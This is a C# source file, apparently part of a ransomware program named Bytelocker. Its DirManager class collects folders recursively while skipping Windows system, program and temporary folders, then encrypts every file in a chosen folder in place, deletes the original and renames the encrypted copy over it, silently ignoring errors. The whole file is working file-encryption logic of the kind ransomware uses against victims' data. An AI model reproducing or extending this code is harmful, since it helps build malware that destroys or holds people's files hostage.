using System;
using System.Collections.Generic;
using System.IO;

namespace Bytelocker.CryptoManager
{
    class DirManager
    {
        private String dir_path;
        public static List<String> FOLDERS_TO_EXCLUDE = new List<String>() { Environment.GetEnvironmentVariable("windir").ToLower(), Environment.GetEnvironmentVariable("ProgramData").ToLower(),
            Environment.GetEnvironmentVariable("APPDATA").ToLower(), Environment.GetEnvironmentVariable("LOCALAPPDATA").ToLower(), (Environment.GetEnvironmentVariable("SystemDrive") + @"\Program Files").ToLower(),
            Environment.GetEnvironmentVariable("TEMP").ToLower(), Environment.GetEnvironmentVariable("TMP").ToLower(), (Environment.GetEnvironmentVariable("SystemDrive") + @"\Program Files (x86)").ToLower(), "$recycle.bin"};

        public void ChooseDir(String dir_path)
        {
            this.dir_path = dir_path;
        }

        public void EncryptDir()
        {
            FileManager fm = new FileManager();

            try
            {
                String[] dir_files = Directory.GetFiles(this.dir_path);

                foreach (String file_path in dir_files)
                {
                    fm.ChooseFile(file_path);
                    fm.SetupFileEncrypter();
                    if (fm.EncryptFile())
                    {
                        fm.DeleteFile();
                        fm.RenameTmpFileToOrig();
                    }
                }

            }
            catch (System.UnauthorizedAccessException)
            {
                // if folder cannot be accessed
            }
            catch (Exception)
            {
            }
        }

        public static List<String> GetFoldersRecursive(String initDir)
        {
            Stack<String> stack_dirs = new Stack<String>();
            List<String> list_dirs = new List<String>();

            stack_dirs.Push(initDir);

            while (stack_dirs.Count > 0)
            {
                String dir = stack_dirs.Pop();

                try
                {
                    if (!(FOLDERS_TO_EXCLUDE.Contains(dir.ToLower())))
                    {
                        list_dirs.Add(dir);

                        foreach (String sub_dir in Directory.GetDirectories(dir))
                        {
                            stack_dirs.Push(sub_dir);
                        }
                    }
                }
                catch (Exception)
                {
                }
            }
            return list_dirs;
        }
    }
}
